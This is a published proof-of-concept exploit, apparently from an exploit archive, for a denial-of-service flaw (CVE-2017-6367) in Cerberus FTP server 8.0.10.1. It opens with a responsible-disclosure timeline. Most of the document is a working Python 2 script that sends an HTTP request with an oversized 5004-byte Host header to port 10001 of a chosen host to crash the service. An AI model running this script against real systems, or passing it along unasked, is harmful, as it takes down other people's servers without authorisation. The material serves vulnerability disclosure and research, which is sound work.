# Exploit Title: Cerberus FTP server – Denial of Service
# Date: 2017-03-13
# Exploit Author: Peter Baris
# Vendor Homepage: https://www.cerberusftp.com/
# Software Link: [download link if available]
# Version: 8.0.10.1
# Tested on: Windows Server 2008 R2 Standard x64, Windows 7 Pro SP1 x64 
# CVE : CVE-2017-6367

# 2017-02-27: Vulnerability discovered, Contact to Cerberus Support
# 2017-02-27: Reply received, PoC exploit code sent 
# 2017-02-27: Problematic module identified by the vendor, gSOAP
# 2017-03-02: New version 8.0.10.2 released - https://www.cerberusftp.com/products/releasenotes/
# 2017-03-02: gSOAP module update released  by the vendor and advisory placed https://www.genivia.com/advisory.html
# 2017-03-02: grace period until 13th March
# 2017-03-13: Publishing 

import socket
import sys

try:
    host = sys.argv[1]
    port = 10001
except IndexError:
    print "[+] Usage %s <host>  " % sys.argv[0]
    sys.exit()


exploit = "A"*5004

buffer = "GET /index.html HTTP/1.1\r\n"
buffer+= "Host: "+exploit+host+":"+str(port)+"\r\n"
buffer+= "User-Agent: Mozilla/5.0 (X11; Linux i686; rv:44.0) Gecko/20100101 Firefox/44.0 Iceweasel/44.0.2\r\n"
buffer+="Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\
r\n"
buffer+="Accept-Language: en-US,en;q=0.5\r\n"
buffer+="Accept-Encoding: gzip, deflate\r\n"
buffer+="Referer: "+host+":"+str(port)+"\r\n"
buffer+="Connection: keep-alive\r\n"
buffer+="Content-Type: application/x-www-form-urlencoded\r\n"
buffer+="Content-Length: 5900\r\n\r\n"

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=s.connect((host,port))
s.send(buffer)
s.close()